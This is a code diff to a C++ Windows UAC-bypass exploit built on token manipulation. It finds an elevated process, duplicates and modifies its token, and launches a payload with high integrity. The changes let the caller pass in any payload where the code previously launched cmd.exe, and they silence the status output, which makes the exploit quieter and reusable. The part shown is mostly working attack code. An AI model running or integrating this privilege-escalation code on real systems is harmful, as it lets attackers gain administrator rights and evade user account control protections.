@@ -9,7 +9,7 @@
  * https://tyranidslair.blogspot.com/2017/05/reading-your-way-around-uac-part-3.html
  */
 
-bool token_manipulation::run()
+bool token_manipulation::run(LPCWSTR pData)
 {
 	// FIRST WE SEARCH FOR ANY RUNNING ELEVATED APP IN SAME SECTION
 	safe_handle process_handle;
@@ -25,8 +25,8 @@ bool token_manipulation::run()
 		return false;
 	}
 
-	std::cout << "[+] Process Id: " << GetProcessId(process_handle.get_handle()) << std::endl;
-	std::cout << "[+] Token Handle: " << std::hex << reinterpret_cast<uint32_t>(token_handle.get_handle()) << std::dec << std::endl;
+	// std::cout << "[+] Process Id: " << GetProcessId(process_handle.get_handle()) << std::endl;
+	// std::cout << "[+] Token Handle: " << std::hex << reinterpret_cast<uint32_t>(token_handle.get_handle()) << std::dec << std::endl;
 
 	// IF CREATED, TERMINATE AUTO-ELEVATING PROCESS
 	if (created_process)
@@ -39,7 +39,7 @@ bool token_manipulation::run()
 		std::cout << "[!] duplicate_token failed" << std::endl;
 		return false;
 	}
-	std::cout << "[+] Duplicated Token Handle: " << std::hex << reinterpret_cast<uint32_t>(dup_token_handle.get_handle()) << std::dec << std::endl;
+	// std::cout << "[+] Duplicated Token Handle: " << std::hex << reinterpret_cast<uint32_t>(dup_token_handle.get_handle()) << std::dec << std::endl;
 
 	// LOWER TOKEN IL FROM HIGH -> MEDIUM
 	if (!token_manipulation::lower_token_il(dup_token_handle))
@@ -64,7 +64,7 @@ bool token_manipulation::run()
 	}
 
 	// LAUNCH PAYLOAD WITH HIGH IL, BYPASSING UAC
-	if (!token_manipulation::launch_payload())
+	if (!token_manipulation::launch_payload(pData))
 	{
 		std::cout << "[!] launch_payload failed" << std::endl;
 		return false;
@@ -227,7 +227,7 @@ bool token_manipulation::revert_impersonation()
 
 	return NT_SUCCESS(status);
 }
-bool token_manipulation::launch_payload()
+bool token_manipulation::launch_payload(LPCWSTR pData)
 {
 	STARTUPINFO si;
 	PROCESS_INFORMATION pi;
@@ -239,7 +239,7 @@ bool token_manipulation::launch_payload()
 
 	auto result = CreateProcessWithLogonW(TEXT("."), TEXT("."), TEXT("."),
 		LOGON_NETCREDENTIALS_ONLY,
-		L"C:\\Windows\\System32\\cmd.exe",
+		pData,
 		NULL, 0, NULL, nullptr,
 		&si, &pi);
 
